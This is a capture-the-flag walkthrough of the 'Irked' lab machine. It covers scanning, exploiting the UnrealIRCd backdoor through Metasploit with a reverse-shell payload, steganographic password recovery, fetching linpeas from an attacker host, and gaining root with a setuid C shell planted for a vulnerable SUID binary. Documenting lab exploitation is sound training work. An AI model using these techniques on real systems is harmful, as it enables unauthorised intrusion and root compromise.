# Irked - Easy

```sh
sudo vim /etc/hosts
# add irked.htb

nmap -T4 -p- -A -Pn -v irked.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 6.7p1 Debian 5+deb8u4
    * 80/tcp - http - Apache httpd 2.4.10
    * 111/tcp - rpcbind 2-4
    * 6697/tcp - irc - UnrealIRCd
    * 8067/tcp - irc - UnrealIRCd
    * 48259/tcp - status 1 (RPC)
    * 65534/tcp - irc - UnrealIRCd

* checking the webpage on port 80, it contains the message "IRC is almost working!" next to an image

* web scan:

    ```sh
    gobuster dir -u http://irked.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # directory scan

    ffuf -c -u "http://irked.htb" -H "Host: FUZZ.irked.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 72 -s
    # subdomain scan
    ```

* ```gobuster``` finds a directory /manual - this leads to 'http://irked.htb/manual/en/index.html', and it is the manual page for Apache HTTP server version 2.4

* we can check the IRC (Internet Relay Chat) service - this allows users to communicate via real-time text-based messages; by default, it uses port 6667/tcp

* to connect to an IRC server, we can use the ```irssi``` client:

    ```sh
    sudo apt install irssi
    ```

* footprinting IRC:

    ```sh
    irssi -c irked.htb -p 6697
    # connection works

    /list
    # no channels or users

    /quit
    ```

* the banner details shows that it is running on Unreal 3.2.8.1; other than that, we could not join any channel as the server was empty

* Googling for UnrealIRCd 3.2.8.1 leads to a backdoor command execution vuln [CVE-2010-2075](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/) - we can try using this to get RCE:

    ```sh
    msfconsole -q

    use exploit/unix/irc/unreal_ircd_3281_backdoor

    options

    set RHOSTS irked.htb
    set RPORT 6697

    run
    # this fails as we need to select a payload explicitly

    show payloads

    set payload payload/cmd/unix/reverse
    # this includes options for reverse shell

    set LHOST tun0
    set LPORT 4444
    
    run
    # exploit works
    ```

* the exploit works and ```metasploit``` opens a session:

    ```sh
    id
    # 'ircd' user

    pwd
    # /home/ircd/Unreal3.2

    ls -la /home
    # we have one more user 'djmardov'

    ls -la /home/djmardov
    # we have read access

    ls -laR /home/djmardov
    # this shows 'permission denied' for most of the files and folders
    # but gives a hidden file '.backup'

    cat /home/djmardov/Documents/.backup
    ```

* the hidden '.backup' file contains the following message:

    ```text
    Super elite steg backup pw
    UPupDOWNdownLRlrBAbaSSss
    ```

* as it refers to a backup password and 'steg' - steganography - refers to hidden data within files like image, audio, zip, etc.

* we can check this further with the image found on the webpage earlier - download the image and check it further using stego tools like ```steghide```:

    ```sh
    steghide info irked.jpg
    # use passphrase found from note

    # this works, and mentions a file 'pass.txt' hidden inside

    # extract the file
    steghide extract -sf irked.jpg

    cat pass.txt
    ```

* the 'pass.txt' file from the image gives us the password 'Kab6h+m+bbp2J:HG' - we can use this to login as 'djmardov':

    ```sh
    ssh djmardov@irked.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    # sudo not available

    ls -la
    ```

* we have a '.mozilla' directory in the user directory, but checking in this recursively for any stored creds does not show any 'logins.json' file

* we can do basic enum using ```linpeas```:

    ```sh
    # fetch script from attacker
    wget http://10.10.14.23:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box is running Linux version 3.16.0-6-686-pae, an older release
    * vulnerable to older exploits like dirtycow (CVE-2016-5195)
    * SUID binaries list includes a non-default binary ```/usr/bin/viewuser```

* we can check the SUID binary first for privesc:

    ```sh
    ls -la /usr/bin/viewuser

    /usr/bin/viewuser
    ```

* running the binary mentions that the app is being developed to set & test user permissions, and is currently in development, followed by some users info; it also mentions a binary ```/tmp/listusers```, which does not exist

* it is possible that it's using the ```/tmp/listusers``` binary, which does not exist, to list the users

* as it is running under a SUID binary, we can create a malicious binary to replace this and attempt privesc:

    ```sh
    cd /tmp

    vim listusers.c

    gcc listusers.c -o listusers
    ```

    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main() {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
        return 0;
    }
    ```

* after creating the malicious binary, we can run the SUID binary again:

    ```sh
    /usr/bin/viewuser
    # this works and we get root shell

    cat /root/root.txt
    # root flag
    ```
